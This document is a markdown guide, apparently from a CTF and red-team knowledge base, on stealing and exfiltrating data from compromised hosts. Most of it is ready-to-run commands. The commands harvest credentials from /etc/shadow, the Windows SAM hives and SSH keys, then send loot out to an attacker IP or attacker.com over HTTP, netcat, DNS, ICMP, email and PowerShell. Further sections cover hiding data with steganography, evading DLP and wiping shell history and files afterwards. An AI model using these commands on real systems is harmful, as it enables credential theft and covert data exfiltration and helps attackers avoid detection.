---
icon: ufo-beam
---

# Exfiltration & Data Theft

## **Exfiltration & Data Theft Techniques â€” Loot. Compress. Vanish.**

***

Once access is achieved, the mission shifts from exploitation to **exfiltration** â€” extracting valuable data, credentials, or flags while avoiding detection.\
This guide covers real-world methods to gather, compress, and stealthily exfiltrate data from compromised systems, both **manually and automatically**.

***

### I. ğŸ§© Core Concepts

| Concept          | Description                                                    |
| ---------------- | -------------------------------------------------------------- |
| **Exfiltration** | Transferring sensitive data from the target to your system.    |
| **Loot**         | Valuable artifacts: flags, passwords, tokens, databases, keys. |
| **Compression**  | Reducing file size for stealth and speed.                      |
| **Encryption**   | Concealing the contents of exfiltrated data.                   |
| **Stealth**      | Avoiding detection by monitoring tools, firewalls, or logs.    |

***

### II. ğŸ§  Identify What to Exfiltrate

#### ğŸ” Primary Targets

| Category            | Examples                                             |
| ------------------- | ---------------------------------------------------- |
| **Credentials**     | `/etc/shadow`, SAM/NTDS.dit, browser creds, SSH keys |
| **Configs**         | `/var/www/html/config.php`, `.env`, `wp-config.php`  |
| **Databases**       | MySQL, SQLite, PostgreSQL dumps                      |
| **Logs**            | `/var/log/auth.log`, event logs                      |
| **Flags / Secrets** | `flag.txt`, API tokens, encryption keys              |

***

### III. âš™ï¸ Data Collection Techniques

#### ğŸ§© 1. File Searching

```bash
find / -type f -iname "*flag*" 2>/dev/null
find / -type f -name "*.conf" -o -name "*.log"
```

#### ğŸ§  2. Keyword Extraction

```bash
grep -ri "password" /var/www 2>/dev/null
grep -ri "key" /home 2>/dev/null
```

#### ğŸ§© 3. Database Dumping

```bash
mysqldump -u root -p database > dump.sql
sqlite3 database.db .dump > dump.txt
```

#### ğŸ’£ 4. Credential Harvesting

```bash
cat /etc/passwd
cat /etc/shadow
find /home -name "id_rsa" 2>/dev/null
```

Windows:

```powershell
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system
reg save HKLM\SECURITY security
```

Then extract:

```bash
secretsdump.py -sam sam -system system -security security LOCAL
```

***

### IV. ğŸ§° Compressing & Packaging Data

#### ğŸ§© Linux Compression

```bash
tar czf loot.tar.gz /etc/passwd /var/www/html
```

#### âš™ï¸ Password-Protected Zip

```bash
zip -rP 'Sup3rS3cr3t!' data.zip /home/user/loot/
```

#### ğŸ§  Encrypt Before Exfil

```bash
gpg -c loot.tar.gz
```

(Enter passphrase â†’ creates `loot.tar.gz.gpg`)

***

### V. ğŸŒ Exfiltration Methods

***

#### ğŸ”¹ 1. HTTP (Quick & Simple)

**Attacker:**

```bash
python3 -m http.server 8000
```

**Victim:**

```bash
curl -F "file=@loot.tar.gz" http://10.10.14.2:8000/upload
```

or:

```bash
wget --post-file=loot.tar.gz http://10.10.14.2/upload
```

***

#### ğŸ”¹ 2. Reverse File Transfer (Netcat)

**Attacker (Receiver):**

```bash
nc -lvnp 4445 > loot.tar.gz
```

**Victim:**

```bash
cat loot.tar.gz | nc 10.10.14.2 4445
```

***

#### ğŸ”¹ 3. SCP / SFTP

```bash
scp /tmp/loot.tar.gz user@10.10.14.2:/tmp/
```

or use SSH key injection for stealth.

***

#### ğŸ”¹ 4. Exfil via HTTP Request (Stealth)

```bash
curl -X POST -d "data=$(cat flag.txt)" http://10.10.14.2/loot
```

***

#### ğŸ”¹ 5. DNS Exfiltration (Covert)

Encode and send data in DNS queries:

```bash
for line in $(cat flag.txt | base32); do
  host $line.attacker.com
done
```

Server-side (attacker):

```bash
sudo tcpdump -i eth0 udp port 53 -n
```

***

#### ğŸ”¹ 6. ICMP Exfiltration

```bash
ping -p "$(xxd -p flag.txt)" 10.10.14.2
```

Attacker captures:

```bash
tcpdump -i tun0 icmp -X
```

***

#### ğŸ”¹ 7. FTP / SMB Exfil

Upload loot through insecure file shares:

```bash
ftp 10.10.14.2
put loot.zip
```

or:

```bash
smbclient //10.10.14.2/share -U user -c "put loot.tar.gz"
```

***

#### ğŸ”¹ 8. Email Exfil (Stealthy)

```bash
echo "FLAG: $(cat /root/flag.txt)" | mail -s "Daily Report" you@attacker.com
```

***

### VI. ğŸ’€ Large File Stealth Exfiltration

#### ğŸ§  Chunked Uploads

```bash
split -b 1M loot.tar.gz chunk_
for i in chunk_*; do curl -F "file=@$i" http://10.10.14.2/upload; done
```

#### âš™ï¸ Covert Timing Channel

```bash
while read -r char; do
  ping -c 1 -W 1 10.10.14.2 -p $char
done < flag.txt
```

***

### VII. ğŸ§© Advanced Exfil Tools

| Tool                        | Description                                |
| --------------------------- | ------------------------------------------ |
| **Nishang (PowerShell)**    | Includes multiple exfil modules            |
| **Exfiltrator-CLI**         | Command-line exfil framework               |
| **DNSExfiltrator**          | Base32-encoded DNS data exfil              |
| **DataSiphon**              | Stealth exfil tool using HTTP/DNS blending |
| **Metasploit post modules** | Exfil credentials and files from sessions  |
| **Empire modules**          | PowerShell-based exfiltration automation   |

***

### VIII. ğŸ§  Data Hiding Before Exfiltration

#### ğŸ”¹ Steganography

```bash
steghide embed -cf image.jpg -ef loot.txt -p secret
```

Extract later:

```bash
steghide extract -sf image.jpg -p secret
```

#### ğŸ”¹ Encode Files

```bash
cat loot.tar.gz | base64 > loot.b64
```

#### ğŸ”¹ Compress, Encode, Encrypt (Triple Stack)

```bash
tar czf - loot/ | gpg -c | base64 > loot.enc
```

***

### IX. âš”ï¸ Full Exfiltration Workflow Example

```bash
# 1. Gather data
find / -type f -iname "*flag*" > loot.txt

# 2. Compress
tar czf loot.tar.gz -T loot.txt

# 3. Encrypt
gpg -c loot.tar.gz

# 4. Exfiltrate
cat loot.tar.gz.gpg | nc 10.10.14.2 4445
```

***

### X. ğŸ§° Windows-Specific Exfiltration

#### ğŸ”¹ Copy System Files

```powershell
copy C:\Users\Admin\Documents\*.docx C:\Temp\
Compress-Archive -Path C:\Temp -DestinationPath loot.zip
```

#### ğŸ”¹ Encode + Send via PowerShell

```powershell
$bytes = [System.IO.File]::ReadAllBytes("loot.zip")
$encoded = [System.Convert]::ToBase64String($bytes)
Invoke-WebRequest -Uri "http://10.10.14.2/upload" -Method POST -Body $encoded
```

#### ğŸ”¹ SMB Pull

```bash
smbclient //victim/C$ -U user -c "get loot.zip"
```

***

### XI. ğŸ§  Anti-Detection Techniques

| Technique                    | Description                                   |
| ---------------------------- | --------------------------------------------- |
| **Timing Jitter**            | Delay packets to mimic normal traffic.        |
| **Protocol Mimicry**         | Use HTTP/HTTPS headers like browsers.         |
| **Compression + Encryption** | Reduce signatures, evade DLP.                 |
| **Filename Spoofing**        | Name files like `report.log` or `backup.tar`. |
| **Fragmentation**            | Split into chunks, reassemble later.          |

Example (timed exfil):

```bash
while read -r line; do
  curl -X POST -d "msg=$line" http://10.10.14.2/api/upload
  sleep 2
done < flag.txt
```

***

### XII. ğŸ§  Pro Tips & Red Team Tricks

âœ… **Operational Security**

* Always encrypt loot before transfer.
* Change timestamps with `touch -t 202312120101 file`.
*   Delete logs after exfil:

    ```bash
    history -c && rm -rf ~/.bash_history
    ```

âœ… **Data Discipline**

*   Maintain loot structure:

    ```
    /loot/
    â”œâ”€â”€ creds/
    â”œâ”€â”€ flags/
    â”œâ”€â”€ configs/
    â””â”€â”€ screenshots/
    ```

âœ… **Stealth**

* Use proxychains or tunnels (Chisel/SSH).
* Obfuscate filenames (`report.tmp`, `sysdata.log`).

âœ… **Post-Exfil Cleanup**

* `shred -u loot.tar.gz.gpg`
* Remove staging dirs, clear temp folders.

***

### XIII. âš™ï¸ Quick Reference Table

| Method     | Command Example          | Notes              |
| ---------- | ------------------------ | ------------------ |
| Netcat     | \`cat file               | nc IP PORT\`       |
| HTTP       | `curl -F "file=@f" URL`  | Blends in          |
| SCP        | `scp file user@host:`    | Secure, traceable  |
| DNS        | `host data.attacker.com` | Covert             |
| ICMP       | `ping -p data IP`        | Very covert        |
| Stego      | `steghide embed ...`     | Visual disguise    |
| Zip+Enc    | `zip -rP 'pw' data.zip`  | Encrypted          |
| PowerShell | `Invoke-WebRequest ...`  | Stealth on Windows |

***

### XIV. ğŸ§© Real-World Exfil Example (CTF Workflow)

```bash
# Attacker
nc -lvnp 4445 > loot.tar.gz.gpg

# Victim
tar czf - /home /var/www | gpg -c | nc 10.10.14.2 4445
```

Decrypt after exfil:

```bash
gpg -d loot.tar.gz.gpg | tar xz
```

***
